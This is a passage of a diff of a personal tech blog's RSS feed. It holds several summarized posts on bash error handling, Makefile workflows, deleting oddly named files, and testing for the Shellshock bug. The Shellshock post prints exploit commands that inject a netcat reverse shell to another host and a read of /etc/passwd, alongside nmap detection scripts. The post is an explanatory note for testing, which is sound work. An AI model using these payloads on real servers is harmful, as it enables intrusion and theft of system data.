+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#c678dd"&gt;while&lt;/span&gt; &lt;span style="color:#e06c75"&gt;IFS&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt; &lt;span style="color:#e5c07b"&gt;read&lt;/span&gt; -r line; &lt;span style="color:#c678dd"&gt;do&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#e06c75"&gt;$line&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#c678dd"&gt;done&lt;/span&gt; &amp;lt; file.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id="parallel-processing"&gt;Parallel Processing&lt;/h4&gt;
+&lt;div class="alert info"&gt;
+&lt;span&gt;&lt;i data-feather="info"&gt;&lt;/i&gt;&lt;/span&gt;
+&lt;span&gt;&lt;strong&gt;Tools like &lt;code&gt;xargs&lt;/code&gt; and GNU &lt;code&gt;parallel&lt;/code&gt; can be incredibly useful.&lt;/strong&gt;&lt;/span&gt;
+&lt;/div&gt;
+&lt;h4 id="error-handling"&gt;Error Handling&lt;/h4&gt;
+&lt;div class="alert info"&gt;
+&lt;span&gt;&lt;i data-feather="info"&gt;&lt;/i&gt;&lt;/span&gt;
+&lt;span&gt;&lt;strong&gt;Robust error handling is critical for creating reliable and maintainable scripts.&lt;/strong&gt;&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Exit on Error: Using set -e ensures that your script exits immediately if any command fails, preventing cascading errors.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;set&lt;/span&gt; -e
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Custom Error Messages: Implement custom error messages to provide more context when something goes wrong.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;command1 &lt;span style="color:#56b6c2"&gt;||&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;{&lt;/span&gt; &lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;command1 failed&amp;#34;&lt;/span&gt;; &lt;span style="color:#e5c07b"&gt;exit&lt;/span&gt; 1; &lt;span style="color:#56b6c2"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Trap Signals: Use the `trap` command to catch and handle signals and errors gracefully.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;trap&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#39;echo &amp;#34;Error occurred&amp;#34;; cleanup; exit 1&amp;#39;&lt;/span&gt; ERR
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#c678dd"&gt;function&lt;/span&gt; cleanup&lt;span style="color:#56b6c2"&gt;()&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#7f848e"&gt;# Cleanup code&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#56b6c2"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Validate Inputs: Always validate user inputs and script arguments to prevent unexpected behavior.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#c678dd"&gt;if&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;[[&lt;/span&gt; -z &lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#e06c75"&gt;$1&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;]]&lt;/span&gt;; &lt;span style="color:#c678dd"&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;Usage: &lt;/span&gt;&lt;span style="color:#e06c75"&gt;$0&lt;/span&gt;&lt;span style="color:#98c379"&gt; &amp;lt;argument&amp;gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e5c07b"&gt;exit&lt;/span&gt; &lt;span style="color:#d19a66"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#c678dd"&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Logging: Implement logging to keep track of script execution and diagnose issues.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;logfile&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;script.log&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;exec&lt;/span&gt; &amp;gt; &amp;gt;&lt;span style="color:#56b6c2"&gt;(&lt;/span&gt;tee -i &lt;span style="color:#e06c75"&gt;$logfile&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;exec&lt;/span&gt; 2&amp;gt;&amp;amp;&lt;span style="color:#d19a66"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;Script started&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id="automating-complex-system-administration-tasks"&gt;Automating Complex System Administration Tasks:&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;Automated Backups&lt;/li&gt;
+&lt;li&gt;System Monitoring&lt;/li&gt;
+&lt;li&gt;User Management&lt;/li&gt;
+&lt;li&gt;Automated Updates&lt;/li&gt;
+&lt;li&gt;Network Configuration&lt;/li&gt;
+&lt;/ol&gt;</description></item><item><title>Makefiles for Web Projects: Manage Your Environment Workflow</title><link>https://linzeyan.github.io/posts/2024/20240805-use-makefile-to-manage-workflows-for-web-projects/</link><pubDate>Mon, 05 Aug 2024 17:21:24 +0800</pubDate><guid>https://linzeyan.github.io/posts/2024/20240805-use-makefile-to-manage-workflows-for-web-projects/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://blog.goodjack.tw/2023/01/use-makefile-to-manage-workflows-for-web-projects.html" target="_blank" rel="noopener"&gt;Makefiles for Web Projects: Manage Your Environment Workflow&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://gagor.pro/2024/02/how-i-stopped-worrying-and-loved-makefiles/" target="_blank" rel="noopener"&gt;How I stopped worrying and loved Makefiles&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Note: Makefile indentation must use tabs, otherwise you&amp;rsquo;ll get syntax errors.&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id="the-core-of-a-makefile-targets"&gt;The Core of a Makefile: Targets&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-makefile" data-lang="makefile"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#61afef;font-weight:bold"&gt;up&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; cp .env.example .env
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; docker compose up -d workspace
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#61afef;font-weight:bold"&gt;stop&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; docker compose stop
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#61afef;font-weight:bold"&gt;zsh&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; docker compose &lt;span style="color:#e5c07b"&gt;exec&lt;/span&gt; workspace zsh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;This example has three targets: &lt;code&gt;up&lt;/code&gt;, &lt;code&gt;stop&lt;/code&gt;, and &lt;code&gt;zsh&lt;/code&gt;. By default, Make treats the first target as the &lt;a href="https://www.gnu.org/software/make/manual/html_node/Goals.html" target="_blank" rel="noopener"&gt;Goal&lt;/a&gt; (it cannot start with a dot), which is the project&amp;rsquo;s primary workflow. In this case, &lt;code&gt;make&lt;/code&gt; and &lt;code&gt;make up&lt;/code&gt; do the same thing.&lt;/li&gt;
+&lt;li&gt;But the copy step above is not a typical Make use case. Make shines at deciding whether each target needs to run. For example, we often store secrets in &lt;code&gt;.env&lt;/code&gt;. If &lt;code&gt;.env&lt;/code&gt; already exists, we shouldn&amp;rsquo;t overwrite it by copying &lt;code&gt;.env.example&lt;/code&gt; again. In that case, we can make &lt;code&gt;.env&lt;/code&gt; a target:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-makefile" data-lang="makefile"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#61afef;font-weight:bold"&gt;up&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;:&lt;/span&gt; .&lt;span style="color:#e06c75"&gt;env&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; docker compose up -d workspace
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#61afef;font-weight:bold"&gt;.env&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; cp .env.example .env
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;By default, target names are treated as filenames. The name &amp;ldquo;make&amp;rdquo; implies building a target; it will only execute the target&amp;rsquo;s recipe when the conditions are met (like the file not existing).
+&lt;ul&gt;
+&lt;li&gt;In this example, when you run the &lt;code&gt;up&lt;/code&gt; target, if &lt;code&gt;.env&lt;/code&gt; doesn&amp;rsquo;t exist it will run the &lt;code&gt;.env&lt;/code&gt; target first to create it, then start the workspace container. If &lt;code&gt;.env&lt;/code&gt; already exists, it skips the &lt;code&gt;.env&lt;/code&gt; target and starts the container directly.&lt;/li&gt;
+&lt;li&gt;Likewise, if there is a file named &lt;code&gt;up&lt;/code&gt; in the directory, the &lt;code&gt;up&lt;/code&gt; target won&amp;rsquo;t run. You can define &lt;a href="https://www.gnu.org/software/make/manual/html_node/Phony-Targets.html" target="_blank" rel="noopener"&gt;Phony Targets&lt;/a&gt; to tell Make that certain targets aren&amp;rsquo;t filenames, but named workflows instead:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-makefile" data-lang="makefile"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#61afef;font-weight:bold"&gt;.PHONY&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;:&lt;/span&gt; &lt;span style="color:#e06c75"&gt;up&lt;/span&gt; &lt;span style="color:#e06c75"&gt;stop&lt;/span&gt; &lt;span style="color:#e06c75"&gt;zsh&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="add-some-variables"&gt;Add Some Variables&lt;/h2&gt;
+&lt;p&gt;Make supports variables (&lt;a href="https://www.gnu.org/software/make/manual/html_node/Setting.html" target="_blank" rel="noopener"&gt;Variable&lt;/a&gt;). Following common Unix environment variable conventions, we usually write them in SCREAMING_SNAKE_CASE. When used, variables are wrapped in &lt;code&gt;$()&lt;/code&gt;.&lt;/p&gt;</description></item><item><title>Test Whether a Server Is Vulnerable to Shellshock Bug</title><link>https://linzeyan.github.io/posts/2022/20221128-linux-shellshock-bug/</link><pubDate>Mon, 28 Nov 2022 15:35:30 +0800</pubDate><guid>https://linzeyan.github.io/posts/2022/20221128-linux-shellshock-bug/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.baeldung.com/linux/shellshock-bug" target="_blank" rel="noopener"&gt;Test Whether a Server Is Vulnerable to Shellshock Bug&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id="the-shellshock-bug"&gt;The Shellshock Bug&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;env &lt;span style="color:#e06c75"&gt;x&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#39; () {:;};&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="exploiting-shellshock-bug"&gt;Exploiting Shellshock Bug&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;A substituted command is executed since the feature ignores the command specified by the user, and instead, it runs that which the ForceCommand defines.&lt;/li&gt;
+&lt;li&gt;The ignored commands from the user are put in the &amp;ldquo;SSH_ORIGINAL_COMMAND&amp;rdquo; environment variable. If the user&amp;rsquo;s default shell is Bash, the Bash shell will parse the value of the &amp;ldquo;SSH_ORIGINAL_COMMAND&amp;rdquo; environment variable on start-up and run the embedded commands.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id="examples-of-shellshock-exploit-commands"&gt;Examples of Shellshock Exploit Commands&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;## 1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl -H &lt;span style="color:#98c379"&gt;&amp;#34;X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 192.168.y.y 443&amp;#34;&lt;/span&gt; 192.168.x.y/CGI-bin/hello.cgi
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;## 2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl --insecure 192.168.x.x -H &lt;span style="color:#98c379"&gt;&amp;#34;User-Agent: () { :; }; /bin/cat /etc/passwd&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;use nmap script to test for the vulnerability&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nmap -sV -p- --script http-shellshock 192.168.x.x
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nmap -sV -p- --script http-shellshock --script-args &lt;span style="color:#e06c75"&gt;uri&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;/cgi-bin/bin,cmd&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;ls 192.168.x.x
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>How to Delete Files With Names That Contain Non-printable Characters</title><link>https://linzeyan.github.io/posts/2022/20221114-delete-files-non-printable-characters/</link><pubDate>Mon, 14 Nov 2022 13:55:17 +0800</pubDate><guid>https://linzeyan.github.io/posts/2022/20221114-delete-files-non-printable-characters/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.baeldung.com/linux/delete-files-non-printable-characters" target="_blank" rel="noopener"&gt;How to Delete Files With Names That Contain Non-printable Characters&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ls -l
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;total &lt;span style="color:#d19a66"&gt;13&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 07:08 &lt;span style="color:#98c379"&gt;&amp;#39; &amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;162&lt;/span&gt; Apr &lt;span style="color:#d19a66"&gt;16&lt;/span&gt; &lt;span style="color:#d19a66"&gt;2022&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#39;~$iscord.docx&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:03 &lt;span style="color:#98c379"&gt;&amp;#39;&amp;#39;$&amp;#39;\302\226&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:01 &lt;span style="color:#98c379"&gt;&amp;#39;&amp;#39;$&amp;#39;\302\226&amp;#39;&amp;#39;Λ---ω&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:13 &lt;span style="color:#98c379"&gt;&amp;#39;␴?␴??␴??::␴?␴&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:12 ␴__␴
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:14 ␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:18 &lt;span style="color:#98c379"&gt;&amp;#39;␴ω␴␴␣␦&amp;#39;$&amp;#39;\342\220\264&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:16 ␣␣␣␣␣␣␣␣
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:26 ␣ μ μ Ω Ω
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;14&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:23 &lt;span style="color:#98c379"&gt;&amp;#39;␣ μ ␴&amp;#39;$&amp;#39;\342\220\264&amp;#39;&amp;#39;Ξ&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:27
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:27
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="using-ansi-c-quoting"&gt;Using ANSI-C Quoting&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Using ANSI-C Quoting&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rm &lt;span style="color:#98c379"&gt;&amp;#39;&amp;#39;$&amp;#39;\302\226&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# We can also use the $ special character before enclosing the filename in single quotes&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rm &lt;span style="color:#98c379"&gt;$&amp;#39;\356\200\215&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# pass an item&amp;#39;s name to rm without using the ANSI-C quoting&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rm &lt;span style="color:#98c379"&gt;&amp;#39;\026\033&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rm: cannot remove &lt;span style="color:#98c379"&gt;&amp;#39;\026\033&amp;#39;&lt;/span&gt;: No such file or directory
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="using-inode-numbers"&gt;Using Inode Numbers&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ls -li
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;total &lt;span style="color:#d19a66"&gt;11&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;...
